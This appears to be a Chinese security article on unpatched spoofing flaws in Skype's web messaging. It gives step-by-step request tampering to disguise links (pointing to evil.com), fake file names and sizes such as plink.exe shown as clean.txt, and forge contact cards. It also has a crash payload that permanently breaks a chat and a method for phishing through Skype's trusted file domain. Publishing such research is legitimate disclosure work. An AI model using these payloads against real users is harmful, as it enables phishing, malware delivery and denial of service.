![](https://image.3001.net/images/20210203/1612329391_601a31af359c8f071b32a.png!small)

众所周知，Skype中存储在这大量的欺骗攻击漏洞，但微软却不认为这些漏洞需要“立即提供安全修复服务”。

## 漏洞介绍

在我们的一次漏洞挖掘过程中，我们对web.skype.com域名进行了测试。在进行了完整的测试之后，我们发现其信息功能中并没有任何防止信息篡改的安全保护机制，因此这里可能会存在欺骗攻击的风险。在本文发稿时，所有提到的漏洞仍然存在。不过，微软并不认为这些漏洞严重到需要立即进行修复，不过可能会在将来的版本中进行修复。

## 链接欺骗

如果你想要让某人访问一个链接，其实是非常简单且有效的。我们一起来看一看该怎么做！

第一步，以下列形式发送你想要伪装的链接：

![](https://image.3001.net/images/20210203/1612329427_601a31d3a73f279f6a4ab.png!small)

第二步，拦截请求，当你查看到下列请求内容的时候再进行转发：

    
    
    POST /v1/users/ME/conversations/19%REDACTED%40thread.skype/messages?x-ecs-etag= HTTP/1.1
    
    Host: azwus1-client-s.gateway.messenger.live.com
    
    ...
    
     
    
    {
    
    "clientmessageid":"123456789",
    
    "composetime":"2021-02-01T23:05:32.546Z",
    
    "content":"<a href=\"https://google.com\">https://google.com</a>",
    
    "messagetype":"RichText",
    
    "contenttype":"text",
    
    "imdisplayname":"mr d0x\"'><h1>hi</h1>",
    
    "properties":{
    
        "urlpreviews":"[{\"key\":\"https://google.com\",\"value\":{\"url\":\"https://google.com\",\"size\":\"49128\",\"status_code\":\"200\",\"content_type\":\"text/html\",\"site\":\"www.google.com\",\"category\":\"generic\",\"title\":\"Google\",\"description\":\"Search the world's information, including webpages, images, videos and more. Google has many special features to help you find exactly what you're looking for.\",\"favicon\":\"https://nus1-urlp-static.secure.skypeassets.com/static/google-32x32.ico\",\"favicon_meta\":{\"width\":32,\"height\":32},\"thumbnail\":\"https://nus1-urlp-static.secure.skypeassets.com/static/google-90x90.png\",\"thumbnail_meta\":{\"width\":90,\"height\":90},\"user_pic\":\"\"}}]"
    
        }
    
     
    
    }

第三步，在请求的“href”属性以及“urlpreviews”键的“key”属性中插入你想要的链接：

    
    
    ...
    
    "content":"<a href=\"https://evil.com\">https://google.com</a>",
    
    ...
    
    "urlpreviews":"[{\"key\":\"https://evil.com\",...

![](https://image.3001.net/images/20210203/1612329450_601a31ea6889e9cd52642.png!small)

伪造的URL将显示在信息的底部位置。为了克服这个问题，只需创建一个真实的子域。比如说：google.image.view.evil.com

![](https://image.3001.net/images/20210203/1612329459_601a31f3214e42cc26be5.png!small)

## 文件名欺骗

在该漏洞的帮助下，我们将能够使用伪造的文件名称以及后缀来给任意用户发送文件。我们发现了多种实现方法，但我们只演示其中一种。

第一步，与任意用户开启聊天，然后点击“Add files”添加文件：

![](https://image.3001.net/images/20210203/1612329470_601a31febe7ce33da03a0.png!small)

第二步，选择你的恶意文件：

![](https://image.3001.net/images/20210203/1612329478_601a3206253ffc6a8663f.png!small)

第三步，发送消息，使用Burp拦截消息，当查看到如下所示的请求内容后转发消息：

    
    
    POST /v1/users/ME/conversations/19%REDACTED%40thread.skype/messages?x-ecs-etag= HTTP/1.1
    
    Host: azwus1-client-s.gateway.messenger.live.com
    
    ...
    
     
    
    {
    
    "clientmessageid": "6937674706420748491",
    
    "composetime": "2021-01-31T20:13:38.249Z",
    
    "content": "<URIObject uri=\"https://api.asm.skype.com/v1/objects/0-cus-d17-REDACTED\" url_thumbnail=\"https://api.asm.skype.com/v1/objects/0-cus-d17-REDACTED/views/original\" type=\"File.1\" doc_id=\"0-cus-d17-REDACTED\">To view this file, go to: <a href=\"https://login.skype.com/login/sso?go=webclient.xmm&docid=0-cus-d17-REDACTED\">https://login.skype.com/login/sso?go=webclient.xmm&docid=0-cus-d17-REDACTED</a><OriginalName v=\"plink.exe\"></OriginalName><FileSize v=\"311296\"></FileSize></URIObject>",
    
    "messagetype": "RichText/Media_GenericFile",
    
    "contenttype": "text",
    
    "imdisplayname": "mr d0x",
    
    "amsreferences": [
    
        "0-cus-d17-REDACTED"
    
        ]
    
    }

第四步，修改“OriginalName”值，包括后缀名：

    
    
    <OriginalName v=\"clean.txt\"></OriginalName>

完成！现在目标用户将看到如下图所示的界面：

![](https://image.3001.net/images/20210203/1612329542_601a32465df87af45c758.png!small)

点击“Download”下载文件之后，原始文件名将会显示出来：

![](https://image.3001.net/images/20210203/1612329550_601a324e34e4c1a1db092.png!small)

## 文件大小欺骗

在这一步，我们需要重复上述的操作，不过第四步需要进行一些修改。我们需要修改的是“FileSize”值：

    
    
    <FileSize v=\"11000000000000\"></FileSize>

我们的文件现在就变成了11TB：

![](https://image.3001.net/images/20210203/1612329567_601a325f0e40528f3e44d.png!small)

## 共享名片欺骗

在与他人分享联系人名片时，我们可以拦截请求并修改名片显示的名称和用户名，并将修改后的内容呈现给目标用户：

    
    
    POST /v1/users/ME/conversations/19%REDACTED%40thread.skype/messages?x-ecs-etag= HTTP/1.1
    
    Host: azwus1-client-s.gateway.messenger.live.com
    
    ...
    
     
    
    {
    
    "clientmessageid":"31905252195064291",
    
    "composetime":"2021-01-31T20:02:39.230Z",
    
    "content":"<contacts><c t=\"s\" s=\"evil.account\" f=\"It's Bob!\"></c></contacts>",
    
    "messagetype":"RichText/Contacts",
    
    "contenttype":"text",
    
    "imdisplayname":"mr d0x",
    
    "properties":{
    
        "forwardMetadata":"{\"isForwarded\":false}"
    
        }
    
    }

![](https://image.3001.net/images/20210203/1612329584_601a327043ca6faed320b.png!small)

## 让任意用户的Skype崩溃

在修改请求主体中“content”值时，我不小心放置了太多的标签，结果导致了对话两端（攻击者和目标用户）的Skype发生了崩溃，并导致聊天内容永久性的无法访问。而且，每当双方试图打开这个对话框时，双方的Skype都会崩溃。

 **我所使用的Payload如下：**

    
    
    "content":"<contacts><URIObject><h1><a href=\"https://google.com \" t=\"s\" s=\" ><contacts><c t=\"s\" s=\"evil.account\" f=\"Mr.d0x\"></c></contacts> </a></h1></URIObject></contacts>"

 **结果如下：**

![](https://image.3001.net/images/20210203/1612329610_601a328a9a29a83d1496d.png!small)

这将导致Web端和桌面客户端的Skype都发生崩溃。不过，手机端的Skpye应用程序不会崩溃。

## 使用Skype的域名进行网络钓鱼攻击

当你在聊天框发送一个文件时，它首先被上传到Skype的服务器上，然后聊天中的每个用户都可以访问该文件。无论正在聊天的是否是好友，就算你删除了这个文件，其他用户仍然可以正常访问。

该文件的链接现在可以通过电子邮件发送到目标，如果他们的Outlook/O365帐户上有活动会话，则该链接允许他们直接下载该文件。

第一步，向目标用户发送或转发文件，忽略错误通知：

![](https://image.3001.net/images/20210203/1612329630_601a329e35284f2204141.png!small)

第二步，拦截请求，当你看到下列请求内容时转发请求：

    
    
    POST /v1/users/ME/conversations/19%REDACTED%40thread.skype/messages?x-ecs-etag= HTTP/1.1
    
    Host: azwus1-client-s.gateway.messenger.live.com
    
    ...
    
     
    
    {
    
    "clientmessageid": "6937674706420748491",
    
    "composetime": "2021-01-31T20:13:38.249Z",
    
    "content": "<URIObject uri=\"https://api.asm.skype.com/v1/objects/0-cus-d17-REDACTED\" url_thumbnail=\"https://api.asm.skype.com/v1/objects/0-cus-d17-REDACTED/views/original\" type=\"File.1\" doc_id=\"0-cus-d17-REDACTED\">To view this file, go to: <a href=\"https://login.skype.com/login/sso?go=webclient.xmm&docid=0-cus-d17-REDACTED\">https://login.skype.com/login/sso?go=webclient.xmm&docid=0-cus-d17-REDACTED</a><OriginalName v=\"plink.exe\"></OriginalName><FileSize v=\"311296\"></FileSize></URIObject>",
    
    "messagetype": "RichText/Media_GenericFile",
    
    "contenttype": "text",
    
    "imdisplayname": "mr d0x",
    
    "amsreferences": [
    
        "0-cus-d17-REDACTED"
    
        ]
    
    }

下载链接位于url_thumbnail中：

    
    
    https://api.asm.skype.com/v1/objects/0-cus-d17-REDACTED/views/original

第三步，删除消息以隐藏痕迹。

现在我们就可以使用该链接对目标进行网络钓鱼攻击了，由于Skype的域名是一个受信任的域名，因此我们不需要担心钓鱼邮件被安全产品标记或检测到。

## 总结

Skype不会对其消息传递组件进行任何类型的篡改验证，因此任何内容都可能被欺骗。

